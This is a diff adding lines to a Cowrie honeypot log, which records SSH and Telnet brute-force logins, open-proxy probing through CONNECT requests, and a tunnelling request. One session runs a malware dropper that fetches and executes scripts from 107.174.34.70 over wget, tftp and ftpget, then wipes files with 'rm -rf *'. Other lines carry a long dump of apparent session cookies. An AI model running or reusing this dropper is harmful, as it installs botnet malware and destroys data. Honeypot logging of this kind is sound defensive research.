@@ -274,3 +274,127 @@
 2017-06-08T22:44:37+0000 [SSHChannel None (3) on SSHService 'ssh-connection' on HoneyPotSSHTransport,12837,91.195.103.196] failed to connect: Connection refused
 2017-06-08T22:44:37+0000 [SSHChannel None (3) on SSHService 'ssh-connection' on HoneyPotSSHTransport,12837,91.195.103.196] sending close 3
 2017-06-08T22:44:59+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:25102 (10.8.41.81:2222) [session: cc316281]
+2017-06-08T22:45:04+0000 [HoneyPotSSHTransport,12862,113.195.145.52] Got remote error, code 11
+	reason: 
+2017-06-08T22:45:04+0000 [HoneyPotSSHTransport,12862,113.195.145.52] connection lost
+2017-06-08T22:45:04+0000 [HoneyPotSSHTransport,12862,113.195.145.52] Connection lost after 4 seconds
+2017-06-08T22:45:10+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 154.16.3.104:41376 (10.8.41.81:2222) [session: 09dee2bd]
+2017-06-08T22:45:10+0000 [HoneyPotSSHTransport,12863,154.16.3.104] Remote SSH version: SSH-2.0-libssh2_1.4.2
+2017-06-08T22:45:10+0000 [HoneyPotSSHTransport,12863,154.16.3.104] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-08T22:45:10+0000 [HoneyPotSSHTransport,12863,154.16.3.104] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-08T22:45:10+0000 [HoneyPotSSHTransport,12863,154.16.3.104] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-08T22:45:10+0000 [HoneyPotSSHTransport,12863,154.16.3.104] NEW KEYS
+2017-06-08T22:45:10+0000 [HoneyPotSSHTransport,12863,154.16.3.104] starting service 'ssh-userauth'
+2017-06-08T22:45:10+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,12863,154.16.3.104] '1111' trying auth 'password'
+2017-06-08T22:45:10+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,12863,154.16.3.104] login attempt: 138
+2017-06-08T22:45:10+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,12863,154.16.3.104] login return, expect: [1111/1111]
+2017-06-08T22:45:12+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,12863,154.16.3.104] login attempt [1111/1111] succeeded
+2017-06-08T22:45:14+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,12863,154.16.3.104] '1111' authenticated with 'password'
+2017-06-08T22:45:14+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,12863,154.16.3.104] starting service 'ssh-connection'
+2017-06-08T22:45:14+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,12863,154.16.3.104] got channel 'session' request
+2017-06-08T22:45:14+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,12863,154.16.3.104] channel open
+2017-06-08T22:45:14+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,12863,154.16.3.104] executing command "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.174.34.70/Swag.sh; chmod 777 Swag.sh; sh Swag.sh; tftp 107.174.34.70 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 107.174.34.70; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 107.174.34.70 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf Swag.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *"
+2017-06-08T22:45:14+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,12863,154.16.3.104] Opening TTY Log: log/tty/20170608-224514-09dee2bd-0e.log
+2017-06-08T22:45:14+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,12863,154.16.3.104] CMD: cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://107.174.34.70/Swag.sh; chmod 777 Swag.sh; sh Swag.sh; tftp 107.174.34.70 -c get tftp1.sh; chmod 777 tftp1.sh; sh tftp1.sh; tftp -r tftp2.sh -g 107.174.34.70; chmod 777 tftp2.sh; sh tftp2.sh; ftpget -v -u anonymous -p anonymous -P 21 107.174.34.70 ftp1.sh ftp1.sh; sh ftp1.sh; rm -rf Swag.sh tftp1.sh tftp2.sh ftp1.sh; rm -rf *
+2017-06-08T22:45:14+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,12863,154.16.3.104] Command found: cd /tmp
+2017-06-08T22:45:14+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,12863,154.16.3.104] Command found: cd /var/run
+2017-06-08T22:45:14+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,12863,154.16.3.104] Command found: cd /mnt
+2017-06-08T22:45:14+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,12863,154.16.3.104] Command found: cd /root
+2017-06-08T22:45:14+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,12863,154.16.3.104] Command found: cd /
+2017-06-08T22:45:14+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,12863,154.16.3.104] Command found: wget http://107.174.34.70/Swag.sh
+2017-06-08T22:45:14+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Starting factory <HTTPProgressDownloader: http://107.174.34.70/Swag.sh>
+2017-06-08T22:45:18+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 192.3.244.150:55244 (10.8.41.81:2223) [session: TT29695]
+2017-06-08T22:45:18+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 192.3.244.150:55256 (10.8.41.81:2223) [session: TT29696]
+2017-06-08T22:45:19+0000 [CowrieTelnetTransport,29695,192.3.244.150] login attempt: 122
+2017-06-08T22:45:19+0000 [CowrieTelnetTransport,29695,192.3.244.150] login return, expect: [CONNECT httpbin.org:443 HTTP/1.1/Host: httpbin.org:443]
+2017-06-08T22:45:21+0000 [CowrieTelnetTransport,29695,192.3.244.150] login attempt [GET http://httpbin.org/get?show_env=1 HTTP/1.1/Connection: close] failed
+2017-06-08T22:45:21+0000 [CowrieTelnetTransport,29695,192.3.244.150] Warning: state changed and new state returned
+2017-06-08T22:45:22+0000 [CowrieTelnetTransport,29695,192.3.244.150] login attempt: 123
+2017-06-08T22:45:22+0000 [CowrieTelnetTransport,29695,192.3.244.150] login return, expect: [CONNECT httpbin.org:443 HTTP/1.1/Host: httpbin.org:443]
+2017-06-08T22:45:24+0000 [CowrieTelnetTransport,29695,192.3.244.150] login attempt [Accept-Language: en-US,en;q=0.5/Accept-Encoding: gzip, deflate, br] failed
+2017-06-08T22:45:24+0000 [CowrieTelnetTransport,29695,192.3.244.150] Warning: state changed and new state returned
+2017-06-08T22:45:25+0000 [CowrieTelnetTransport,29695,192.3.244.150] login attempt: 124
+2017-06-08T22:45:25+0000 [CowrieTelnetTransport,29695,192.3.244.150] login return, expect: [CONNECT httpbin.org:443 HTTP/1.1/Host: httpbin.org:443]
+2017-06-08T22:45:27+0000 [CowrieTelnetTransport,29695,192.3.244.150] login attempt [Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8/Upgrade-Insecure-Requests: 1] failed
+2017-06-08T22:45:27+0000 [CowrieTelnetTransport,29695,192.3.244.150] Warning: state changed and new state returned
+2017-06-08T22:45:27+0000 [CowrieTelnetTransport,29695,192.3.244.150] login attempt: 125
+2017-06-08T22:45:27+0000 [CowrieTelnetTransport,29695,192.3.244.150] login return, expect: [CONNECT httpbin.org:443 HTTP/1.1/Host: httpbin.org:443]
+2017-06-08T22:45:29+0000 [CowrieTelnetTransport,29695,192.3.244.150] login attempt [Host: httpbin.org/Cookie: symfony=jjd3llnubtf3egdochvnrjna31; fe_typo_user=6271fc6f71cedd86b9fb50daf43f9ee0; ccup_user_pwd=1296f48a63MDA2MDAxMTAyMTc0NDRgM2MzNTQyNmQ1MTEwNDM2NTk; VngState=0; session_id_akamon_yushinsya00_front="9409266:0dd32fd5-6496-4bc1-96b6-117e7dcd9a9e"; ASPSESSIONIDSAQSSDBD=LHIMPDHAFOMJLPOCGOGECDIO; atlassian.xsrf.token=BS4Z-AIZN-4FMI-LP7W|c648b4ccafe66ae12d463f04558e160464c0341d|lout; SERVID=F1; BIGipServer~Shipping~changjiangboyun-107=1812005130.20480.0000; session_id_akamon_yushinsya00=192.3.244.150-7e6fa9ba-8272-40b2-833b-62fdea67b758; ftkeyid=7f94f8185c31609aacb306cf555c63156494204c4bac3660; PHPSESSID=41222a9d23fcc295fd4c75121376b571; ADNUSERID=bhlgjspuxk; BCSI-CS-d65d63e3f6f2652d=2; ROUTEID=.1; bolt_session=7cbb0c99e938fa04105c2524120afe14; BIGipServerL4_wx8080=1208763914.36895.0000; B-Check=21331392aJGJBLk4BkN8YHz1d8Kqj+s+tETmWOH; css_name=style_ns.css; ASPSESSIONIDAATDBBRT=HMFLCLMAACEPOABANJMJJIMH; ccup_safecode=1296f48a63MDA2MDAxMTAyMTc0NDRgM2MzNTQyNmQ1MTEwNDM2NTk; ASPSESSIONIDSCRATSQT=OFGEHINALOIDPFNPMDKFNDNH; ccup_username=1296f48a63MDA2MDAxMTAyMTc0NDRgM2MzNTQyNmQ1MTEwNDM2NTk; ASPSESSIONIDQSBCCASD=AIPDDGLAEJLMONNHDAPMLPHI; bb2_screener_=1496958663+192.3.244.150; 62c6dbe6d388fe82519d53a65d7a3345=oeak0eajlppn5fvc3qb3ajfju7; JSESSIONID=46A445D8B269EC16E3A33D0A2F8A5AB5; default=msug8l48mudcq6q7v4q47bh2e2; SessionID=; 2978253f7daa9cd467d0ae36d563a807=20ie2loicho3crrp1h6g3clgv2; AWSELB=914B835AEB4229EF388D8CBAFA83D669042BF932419370CC83EA37424C44270D19A6B4608E201F89BDAD69F2958664DD42CE364458241ED8E3EC5B88AE64DD1D2E686D91; ccup_user_id=1296f48a63MDA2MDAxMTAyMTc0NDRgM2MzNTQyNmQ1MTEwNDM2NTk; webadmin=9ob4lblh2fvgkjdg7snbdbso81; eqnetwork.com=C; JSESSIONID-L=618a4c4e-63c5-4e13-8ba8-13402ad900d5; PD-H-SESSION-ID=1_4_0_Hn+JI4sF2uZve70wMLpEOLcYUpAj6nXwZltRKSPrGHZL0K8A; ASPSESSIONIDSSDTTCSS=OAJLFIGCEBLMCKCNBAPMBGMC; ccup_head_ico=1296f48a63MDA2MDAxMTAyMTc0NDRgM2MzNTQyNmQ1MTEwNDM2NTk; AIROS_SESSIONID=9abc8e3a79d26a7a58071ea6da0cdc35; connect.sid=s%3A6wlSRtf9NZAPjgkTg5emLj8ruuY-1Scx.SXj5GpFrStCLcgTjN0HKN3pRchoWqpwVH2NYkEQNli4; flarum_session=vgpqpgbn8f5ktg5rltmjoipv17; _zk_sc_tc1=1; OutlookSession=b0b79db705ea485c930bb7f55e3f08ce; ASPSESSIONIDCSADTAQQ=GGKJICMAFIBLPNJGOEDIGANP; JSESSIONID.8dcabb9c=1lezvz2p59kv5zdsvy299x7gf; BIGipServer~Shipping~fcos.changjiang.sinotrans.com_7003=924130988.23323.0000; BIGipServerNSSV20054-Pool_sv001=rd171o00000000000000000000ffffc0a864a9o80; cookiesession1=01701CDFXA1SHOFABUV2LNIBSGNT287A; wgSession=IfJA5G1gBaVH_-AztZ4pGw; BIGipServerpool_wap=3873588282.20480.0000; ccup_shoppingcart=1296f48a63MDA2MDAxMTAyMWM3YjE8PDFmZTkxMzExNzhtMGNjZWR7JmdvbWx0JjpeXSMlcHZvZHVjdyY6Wlh9; ASP.NET_SessionId=dzhpy5sc3k22smrksfpedgag; NSC_ofx_3h.e.do=ffffffff75985cf845525d5f4f58455e445a4a423660; X-Mapping-dbngmded=F0D38F5B3A36555E4887097FC58982E8; Session=Login; _gitlab_session=0c9a53a4e05551e5c71c254265591e33; ui_language=en_US; b44988b83898bb7703d652b84612cd2e=3ug9kre860tembdta49rg9fkc5; AWSALB=vf0eXIrb8UbBrAd3I3EjuMUSeq8IlvJsDgW1hRLvuVGvVtg86EhnXWsWHeEWDNIy8tnz+KgYbsjc5kCsiazTgSlJC/xF3l+CQp645AMma2FX5QStcI2aksdrRHU0; nsunid=tOtCTFk5rl5P+wv4FKhnAg==; citrix_ns_id=UQg8WJlMLmZoekJuBw8zplA3d54A010; language=en-gb; __ads_session=/CeSTI8t7Aid5uQdlgA=; SESS012c059df30be6f6c77e1b8447d7a15c=g8tuvrqvtlv6125t34l0a4r0k4; WR_PROXY_AUTH=F761252D36B371AE7A3033BD12A0E283; currency=USD; _sm_au_d=1; citrix_ns_id_.httpbin.org_%2F_wat=UEQtSC1TRVNTSU9OLUlE?SJ82AsxBVYGiU6PH+wRdjUBplKkA&; safedog-flow-item=950EAE0AA91A04702693C8FD2F7E4301; __cfduid=dfeeddc99dd8aa2943e043101671d8bf11496953643] failed
+2017-06-08T22:45:29+0000 [CowrieTelnetTransport,29695,192.3.244.150] Warning: state changed and new state returned
+2017-06-08T22:45:29+0000 [CowrieTelnetTransport,29695,192.3.244.150] login attempt: 126
+2017-06-08T22:45:29+0000 [CowrieTelnetTransport,29695,192.3.244.150] login return, expect: [CONNECT httpbin.org:443 HTTP/1.1/Host: httpbin.org:443]
+2017-06-08T22:45:31+0000 [CowrieTelnetTransport,29695,192.3.244.150] login attempt [User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:51.0) Gecko/20100101 Firefox/51.0/] failed
+2017-06-08T22:45:31+0000 [CowrieTelnetTransport,29695,192.3.244.150] Warning: state changed and new state returned
+2017-06-08T22:45:32+0000 [CowrieTelnetTransport,29696,192.3.244.150] login attempt: 127
+2017-06-08T22:45:32+0000 [CowrieTelnetTransport,29696,192.3.244.150] login return, expect: [CONNECT httpbin.org:443 HTTP/1.1/Host: httpbin.org:443]
+2017-06-08T22:45:34+0000 [CowrieTelnetTransport,29696,192.3.244.150] login attempt [CONNECT httpbin.org:443 HTTP/1.1/Host: httpbin.org:443] succeeded
+2017-06-08T22:45:35+0000 [CowrieTelnetTransport,29696,192.3.244.150] Opening TTY Log: log/tty/20170608-224535-None-29696i.log
+2017-06-08T22:45:35+0000 [CowrieTelnetTransport,29696,192.3.244.150] Warning: state changed and new state returned
+2017-06-08T22:45:35+0000 [CowrieTelnetTransport,29696,192.3.244.150] CMD: 
+2017-06-08T22:45:35+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 192.3.244.150:55332 (10.8.41.81:2223) [session: TT29697]
+2017-06-08T22:45:35+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 192.3.244.150:58186 (10.8.41.81:2223) [session: TT29698]
+2017-06-08T22:45:35+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,12863,154.16.3.104] received eof, sending ctrl-d to command
+2017-06-08T22:45:35+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,12863,154.16.3.104] remote close
+2017-06-08T22:45:35+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,12863,154.16.3.104] Closing TTY Log: log/tty/20170608-224514-09dee2bd-0e.log after 21 seconds
+2017-06-08T22:45:35+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,12863,154.16.3.104] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-08T22:45:35+0000 [SSHChannel session (0) on SSHService 'ssh-connection' on HoneyPotSSHTransport,12863,154.16.3.104] sending close 0
+2017-06-08T22:45:35+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:49824 (10.8.41.81:2222) [session: 7cd30595]
+2017-06-08T22:45:35+0000 [CowrieTelnetTransport,29695,192.3.244.150] Connection lost after 16 seconds
+2017-06-08T22:45:37+0000 [CowrieTelnetTransport,29697,192.3.244.150] login attempt: 128
+2017-06-08T22:45:37+0000 [CowrieTelnetTransport,29697,192.3.244.150] login return, expect: [CONNECT httpbin.org:443 HTTP/1.1/Host: httpbin.org:443]
+2017-06-08T22:45:39+0000 [CowrieTelnetTransport,29697,192.3.244.150] login attempt [CONNECT httpbin.org:443 HTTP/1.1/Host: httpbin.org:443] succeeded
+2017-06-08T22:45:40+0000 [CowrieTelnetTransport,29697,192.3.244.150] Opening TTY Log: log/tty/20170608-224540-None-29697i.log
+2017-06-08T22:45:40+0000 [CowrieTelnetTransport,29697,192.3.244.150] Warning: state changed and new state returned
+2017-06-08T22:45:40+0000 [CowrieTelnetTransport,29697,192.3.244.150] CMD: 
+2017-06-08T22:45:41+0000 [CowrieTelnetTransport,29698,192.3.244.150] login attempt: 129
+2017-06-08T22:45:41+0000 [CowrieTelnetTransport,29698,192.3.244.150] login return, expect: [CONNECT httpbin.org:443 HTTP/1.1/Host: httpbin.org:443]
+2017-06-08T22:45:42+0000 [CowrieTelnetTransport,29698,192.3.244.150] login attempt [GET http://httpbin.org/get?show_env=1 HTTP/1.1/Connection: close] failed
+2017-06-08T22:45:42+0000 [CowrieTelnetTransport,29698,192.3.244.150] Warning: state changed and new state returned
+2017-06-08T22:45:43+0000 [CowrieTelnetTransport,29698,192.3.244.150] login attempt: 130
+2017-06-08T22:45:43+0000 [CowrieTelnetTransport,29698,192.3.244.150] login return, expect: [CONNECT httpbin.org:443 HTTP/1.1/Host: httpbin.org:443]
+2017-06-08T22:45:45+0000 [CowrieTelnetTransport,29698,192.3.244.150] login attempt [Accept-Language: en-US,en;q=0.5/Accept-Encoding: gzip, deflate, br] failed
+2017-06-08T22:45:45+0000 [CowrieTelnetTransport,29698,192.3.244.150] Warning: state changed and new state returned
+2017-06-08T22:45:45+0000 [CowrieTelnetTransport,29698,192.3.244.150] login attempt: 131
+2017-06-08T22:45:45+0000 [CowrieTelnetTransport,29698,192.3.244.150] login return, expect: [CONNECT httpbin.org:443 HTTP/1.1/Host: httpbin.org:443]
+2017-06-08T22:45:47+0000 [CowrieTelnetTransport,29698,192.3.244.150] login attempt [Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8/Upgrade-Insecure-Requests: 1] failed
+2017-06-08T22:45:47+0000 [CowrieTelnetTransport,29698,192.3.244.150] Warning: state changed and new state returned
+2017-06-08T22:45:47+0000 [CowrieTelnetTransport,29698,192.3.244.150] login attempt: 132
+2017-06-08T22:45:47+0000 [CowrieTelnetTransport,29698,192.3.244.150] login return, expect: [CONNECT httpbin.org:443 HTTP/1.1/Host: httpbin.org:443]
+2017-06-08T22:45:49+0000 [CowrieTelnetTransport,29698,192.3.244.150] login attempt [Host: httpbin.org/Cookie: symfony=jjd3llnubtf3egdochvnrjna31; fe_typo_user=6271fc6f71cedd86b9fb50daf43f9ee0; ccup_user_pwd=1296f48a63MDA2MDAxMTAyMTc0NDRgM2MzNTQyNmQ1MTEwNDM2NTk; VngState=0; session_id_akamon_yushinsya00_front="9409266:0dd32fd5-6496-4bc1-96b6-117e7dcd9a9e"; ASPSESSIONIDSAQSSDBD=LHIMPDHAFOMJLPOCGOGECDIO; atlassian.xsrf.token=BS4Z-AIZN-4FMI-LP7W|c648b4ccafe66ae12d463f04558e160464c0341d|lout; SERVID=F1; BIGipServer~Shipping~changjiangboyun-107=1812005130.20480.0000; session_id_akamon_yushinsya00=192.3.244.150-7e6fa9ba-8272-40b2-833b-62fdea67b758; ftkeyid=7f94f8185c31609aacb306cf555c63156494204c4bac3660; PHPSESSID=41222a9d23fcc295fd4c75121376b571; ADNUSERID=bhlgjspuxk; BCSI-CS-d65d63e3f6f2652d=2; ROUTEID=.1; bolt_session=7cbb0c99e938fa04105c2524120afe14; BIGipServerL4_wx8080=1208763914.36895.0000; B-Check=21331392aJGJBLk4BkN8YHz1d8Kqj+s+tETmWOH; css_name=style_ns.css; ASPSESSIONIDAATDBBRT=HMFLCLMAACEPOABANJMJJIMH; ccup_safecode=1296f48a63MDA2MDAxMTAyMTc0NDRgM2MzNTQyNmQ1MTEwNDM2NTk; ASPSESSIONIDSCRATSQT=OFGEHINALOIDPFNPMDKFNDNH; ccup_username=1296f48a63MDA2MDAxMTAyMTc0NDRgM2MzNTQyNmQ1MTEwNDM2NTk; ASPSESSIONIDQSBCCASD=AIPDDGLAEJLMONNHDAPMLPHI; bb2_screener_=1496958663+192.3.244.150; 62c6dbe6d388fe82519d53a65d7a3345=oeak0eajlppn5fvc3qb3ajfju7; JSESSIONID=46A445D8B269EC16E3A33D0A2F8A5AB5; default=msug8l48mudcq6q7v4q47bh2e2; SessionID=; 2978253f7daa9cd467d0ae36d563a807=20ie2loicho3crrp1h6g3clgv2; AWSELB=914B835AEB4229EF388D8CBAFA83D669042BF932419370CC83EA37424C44270D19A6B4608E201F89BDAD69F2958664DD42CE364458241ED8E3EC5B88AE64DD1D2E686D91; ccup_user_id=1296f48a63MDA2MDAxMTAyMTc0NDRgM2MzNTQyNmQ1MTEwNDM2NTk; webadmin=9ob4lblh2fvgkjdg7snbdbso81; eqnetwork.com=C; JSESSIONID-L=618a4c4e-63c5-4e13-8ba8-13402ad900d5; PD-H-SESSION-ID=1_4_0_Hn+JI4sF2uZve70wMLpEOLcYUpAj6nXwZltRKSPrGHZL0K8A; ASPSESSIONIDSSDTTCSS=OAJLFIGCEBLMCKCNBAPMBGMC; ccup_head_ico=1296f48a63MDA2MDAxMTAyMTc0NDRgM2MzNTQyNmQ1MTEwNDM2NTk; AIROS_SESSIONID=9abc8e3a79d26a7a58071ea6da0cdc35; connect.sid=s%3A6wlSRtf9NZAPjgkTg5emLj8ruuY-1Scx.SXj5GpFrStCLcgTjN0HKN3pRchoWqpwVH2NYkEQNli4; flarum_session=vgpqpgbn8f5ktg5rltmjoipv17; _zk_sc_tc1=1; OutlookSession=b0b79db705ea485c930bb7f55e3f08ce; ASPSESSIONIDCSADTAQQ=GGKJICMAFIBLPNJGOEDIGANP; JSESSIONID.8dcabb9c=1lezvz2p59kv5zdsvy299x7gf; BIGipServer~Shipping~fcos.changjiang.sinotrans.com_7003=924130988.23323.0000; BIGipServerNSSV20054-Pool_sv001=rd171o00000000000000000000ffffc0a864a9o80; cookiesession1=01701CDFXA1SHOFABUV2LNIBSGNT287A; wgSession=IfJA5G1gBaVH_-AztZ4pGw; BIGipServerpool_wap=3873588282.20480.0000; ccup_shoppingcart=1296f48a63MDA2MDAxMTAyMWM3YjE8PDFmZTkxMzExNzhtMGNjZWR7JmdvbWx0JjpeXSMlcHZvZHVjdyY6Wlh9; ASP.NET_SessionId=dzhpy5sc3k22smrksfpedgag; NSC_ofx_3h.e.do=ffffffff75985cf845525d5f4f58455e445a4a423660; X-Mapping-dbngmded=F0D38F5B3A36555E4887097FC58982E8; Session=Login; _gitlab_session=0c9a53a4e05551e5c71c254265591e33; ui_language=en_US; b44988b83898bb7703d652b84612cd2e=3ug9kre860tembdta49rg9fkc5; AWSALB=vf0eXIrb8UbBrAd3I3EjuMUSeq8IlvJsDgW1hRLvuVGvVtg86EhnXWsWHeEWDNIy8tnz+KgYbsjc5kCsiazTgSlJC/xF3l+CQp645AMma2FX5QStcI2aksdrRHU0; nsunid=tOtCTFk5rl5P+wv4FKhnAg==; citrix_ns_id=UQg8WJlMLmZoekJuBw8zplA3d54A010; language=en-gb; __ads_session=/CeSTI8t7Aid5uQdlgA=; SESS012c059df30be6f6c77e1b8447d7a15c=g8tuvrqvtlv6125t34l0a4r0k4; WR_PROXY_AUTH=F761252D36B371AE7A3033BD12A0E283; currency=USD; _sm_au_d=1; citrix_ns_id_.httpbin.org_%2F_wat=UEQtSC1TRVNTSU9OLUlE?SJ82AsxBVYGiU6PH+wRdjUBplKkA&; safedog-flow-item=950EAE0AA91A04702693C8FD2F7E4301; __cfduid=dfeeddc99dd8aa2943e043101671d8bf11496953643] failed
+2017-06-08T22:45:49+0000 [CowrieTelnetTransport,29698,192.3.244.150] Warning: state changed and new state returned
+2017-06-08T22:45:51+0000 [CowrieTelnetTransport,29698,192.3.244.150] login attempt: 133
+2017-06-08T22:45:51+0000 [CowrieTelnetTransport,29698,192.3.244.150] login return, expect: [CONNECT httpbin.org:443 HTTP/1.1/Host: httpbin.org:443]
+2017-06-08T22:45:53+0000 [CowrieTelnetTransport,29698,192.3.244.150] login attempt [User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:51.0) Gecko/20100101 Firefox/51.0/] failed
+2017-06-08T22:45:53+0000 [CowrieTelnetTransport,29698,192.3.244.150] Warning: state changed and new state returned
+2017-06-08T22:45:53+0000 [CowrieTelnetTransport,29698,192.3.244.150] Connection lost after 17 seconds
+2017-06-08T22:45:53+0000 [HoneyPotSSHTransport,12864,113.195.145.52] Got remote error, code 11
+	reason: 
+2017-06-08T22:45:53+0000 [HoneyPotSSHTransport,12864,113.195.145.52] connection lost
+2017-06-08T22:45:53+0000 [HoneyPotSSHTransport,12864,113.195.145.52] Connection lost after 17 seconds
+2017-06-08T22:45:53+0000 [-] Connection was probably lost. Could not write to terminal
+2017-06-08T22:45:53+0000 [-] Connection was probably lost. Could not write to terminal
+2017-06-08T22:45:53+0000 [cowrie.commands.wget.HTTPProgressDownloader#info] Stopping factory <HTTPProgressDownloader: http://107.174.34.70/Swag.sh>
+2017-06-08T22:45:53+0000 [CowrieTelnetTransport,29696,192.3.244.150] Closing TTY Log: log/tty/20170608-224535-None-29696i.log after 17 seconds
+2017-06-08T22:45:53+0000 [CowrieTelnetTransport,29696,192.3.244.150] honeypot terminal protocol connection lost [Failure instance: Traceback (failure with no frames): <class 'twisted.internet.error.ConnectionDone'>: Connection was closed cleanly.
+	]
+2017-06-08T22:45:53+0000 [CowrieTelnetTransport,29696,192.3.244.150] Connection lost after 34 seconds
+2017-06-08T22:45:53+0000 [HoneyPotSSHTransport,12863,154.16.3.104] avatar 1111 logging out
+2017-06-08T22:45:53+0000 [HoneyPotSSHTransport,12863,154.16.3.104] connection lost
+2017-06-08T22:45:53+0000 [HoneyPotSSHTransport,12863,154.16.3.104] Connection lost after 43 seconds
+2017-06-08T22:45:53+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 192.3.244.150:59642 (10.8.41.81:2223) [session: TT29699]
+2017-06-08T22:45:53+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 192.3.244.150:34532 (10.8.41.81:2223) [session: TT29700]
+2017-06-08T22:45:53+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,12837,91.195.103.196] got channel 'direct-tcpip' request
+2017-06-08T22:45:53+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,12837,91.195.103.196] direct-tcp connection request to 23.5.96.14:443 from localhost:5556
+2017-06-08T22:45:53+0000 [CowrieTelnetTransport,29699,192.3.244.150] login attempt: 134
+2017-06-08T22:45:53+0000 [CowrieTelnetTransport,29699,192.3.244.150] login return, expect: [CONNECT httpbin.org:443 HTTP/1.1/Host: httpbin.org:443]
+2017-06-08T22:45:55+0000 [CowrieTelnetTransport,29699,192.3.244.150] login attempt [CONNECT httpbin.org:443 HTTP/1.1/Host: httpbin.org:443] succeeded
+2017-06-08T22:45:57+0000 [CowrieTelnetTransport,29699,192.3.244.150] Opening TTY Log: log/tty/20170608-224557-None-29699i.log
+2017-06-08T22:45:57+0000 [CowrieTelnetTransport,29699,192.3.244.150] Warning: state changed and new state returned
+2017-06-08T22:45:57+0000 [CowrieTelnetTransport,29699,192.3.244.150] CMD: 
+2017-06-08T22:45:57+0000 [CowrieTelnetTransport,29700,192.3.244.150] login attempt: 135
+2017-06-08T22:45:57+0000 [CowrieTelnetTransport,29700,192.3.244.150] login return, expect: [CONNECT httpbin.org:443 HTTP/1.1/Host: httpbin.org:443]
+2017-06-08T22:45:59+0000 [CowrieTelnetTransport,29700,192.3.244.150] login attempt [GET http://httpbin.org/get?show_env=1 HTTP/1.1/Connection: close] failed
+2017-06-08T22:45:59+0000 [CowrieTelnetTransport,29700,192.3.244.150] Warning: state changed and new state returned
+2017-06-08T22:46:00+0000 [CowrieTelnetTransport,29700,192.3.244.150] login attempt: 136
+2017-06-08T22:46:00+0000 [CowrieTelnetTransport,29700,192.3.244.150] login return, expect: [CONNECT httpbin.org:443 HTTP/1.1/Host: httpbin.org:443]
